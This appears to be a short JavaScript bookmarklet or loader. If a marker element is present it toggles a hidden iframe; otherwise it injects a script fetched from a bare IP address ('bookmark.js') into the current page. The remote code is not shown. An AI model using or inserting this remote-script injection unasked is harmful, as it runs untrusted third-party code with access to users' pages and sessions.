if(document.getElementsByName("e").length >= 1) {
  document.getElementById("eiframe").classList.toggle("ehidden");
} else {
  var ae = document.createElement("script"); 
  ae.src = "https://3.214.198.63/bookmark.js"; 
  document.body.appendChild(ae)
}
